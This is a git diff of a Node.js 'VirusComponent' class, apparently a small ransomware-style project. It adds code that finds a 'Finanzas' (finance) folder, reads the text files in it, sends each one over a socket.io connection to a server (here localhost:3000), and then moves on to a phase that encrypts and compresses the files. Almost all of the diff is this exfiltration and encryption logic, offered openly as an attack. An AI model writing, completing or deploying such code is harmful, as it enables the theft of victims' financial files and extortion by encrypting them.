@@ -1,9 +1,32 @@
 import fs, { promises } from 'node:fs';
 import { join } from 'node:path';
 import zlib from 'node:zlib';
+import WebSocket from 'ws';
+import { io } from 'socket.io-client';
 
 class VirusComponent {
     constructor() {
+
+    }
+
+    socketConnection(){ 
+        const socket = io("ws://localhost:3000", {
+            reconnectionDelayMax: 10000,
+        });
+
+        socket.on('connect', () => {
+            console.log("Connected to server");
+        });
+
+        socket.io.on('reconnect', () => {
+            console.log("Reconnected to server");
+        });
+
+        socket.on('disconnect', () => {
+            console.log("Disconnected from server");
+        });
+
+        return socket;
     }
 
     async attack() {
@@ -18,20 +41,28 @@ class VirusComponent {
             console.log("***********************************************");
             console.log("PHASE2. Reading files in Finanzas folder...");
             console.log("***********************************************");
-            const binaryFiles = await this.readFiles(finanzasFolderPath, 'binary');
             const textFiles = await this.readFiles(finanzasFolderPath, 'text');
             if(textFiles.length > 0) {
-                textFiles.forEach(file => console.log(`Text file: ${file.name}. Content: ${file.content}`))
+                const socketCli = this.socketConnection();
+                console.log("PHASE2.SUCCESS. Files read successfully.");
+                console.log("***********************************************");
+                console.log("PHASE3. Sending files to socket server.")
+                console.log("***********************************************");
+
+                textFiles.forEach(file => {
+                    this.sendFileToServer(socketCli, file)
+                    .then(() => {
+                        console.log("PHASE3.SUCCESS. Files sent successfully.")
+                        console.log("***********************************************");
+                    }).catch(error => {
+                        console.error("PHASE3.ERROR. ", error);
+                        return console.log("***********************************************");
+                    });
+                });
             } else {
                 console.log("PHASE2.WARNING. No text files found in the Finanzas folder");
             }
-            if(binaryFiles.length > 0) {
-                binaryFiles.forEach(file => console.log(`Binary file: ${file.name}. Content: ${file.content}`))
-            } else {
-                console.log("PHASE2.WARNING.No binary files found in the Finanzas folder");
-            }
-            console.log("***********************************************");
-            console.log("PHASE2.SUCCESS. Files read successfully.");
+            console.log("PHASE4. Encrypting and compressing files...");
         } else {
             console.log("PHASE1.ERROR. Finanzas folder not found in the PC.");
             console.log("Attack stopped...");
@@ -40,30 +71,8 @@ class VirusComponent {
         }
     }
 
-    sendFileToServer(file) {
-        return new Promise((resolve, reject) => {
-            const socket = new WebSocket(url);
-
-            socket.onopen = () => {
-                // Convert the file to binary data
-                const reader = new FileReader();
-                reader.onload = () => {
-                    const fileData = reader.result;
-                    socket.send(fileData);
-                };
-                reader.onerror = (error) => reject(error);
-                reader.readAsArrayBuffer(file);
-            };
-
-            socket.onerror = (error) => reject(error);
-
-            socket.onmessage = (event) => {
-                const response = event.data;
-                resolve(response);
-            };
-
-            socket.onclose = () => resolve('Connection closed');
-        });
+    async sendFileToServer(socketCli, file) {
+        socketCli.emit('file', file);
     }
 
     encryptAndCompressFolder(folderPath) {
